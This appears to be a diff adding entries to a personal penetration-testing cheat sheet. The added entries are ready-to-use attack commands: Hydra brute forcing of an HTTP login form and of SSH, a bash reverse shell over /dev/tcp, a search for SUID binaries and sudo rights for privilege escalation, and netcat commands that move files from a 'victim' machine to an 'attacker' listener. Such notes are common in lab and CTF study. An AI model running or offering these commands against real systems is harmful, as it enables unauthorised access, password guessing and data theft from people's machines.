@@ -64,6 +64,45 @@ sudo nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.
 | Oracle | SELECT banner FROM v$version
 | SQLite | sqlite_version()
 
+# Brute Force HTTP Form
+## Hydra
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.15 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout" -F
+```
+
+# Reverse shell
+```bash
+bash -c 'bash -i >& /dev/tcp/<local_ip>/<port> 0>&1'
+
+```
+# Capabilities
+```bash
+find / -perm -4000 2>/dev/null
+
+```
+# Sending files (attacker/victim)
+```bash
+# attacker
+nc -lp 4444 > destino_file.txt
+
+# victims machine
+nc 192.168.1.14 4444 < original_file.txt
+
+```
+
+# SSH Brute force
+```bash
+# make users.txt
+# make password.txt
+$ hydra -L users.txt -P passwords.txt 192.168.1.12 ssh -V -f # put ip's victims machine
+
+
+```
+# SUDOERS
+```bash
+sudo -l
+
+```
 
 
 
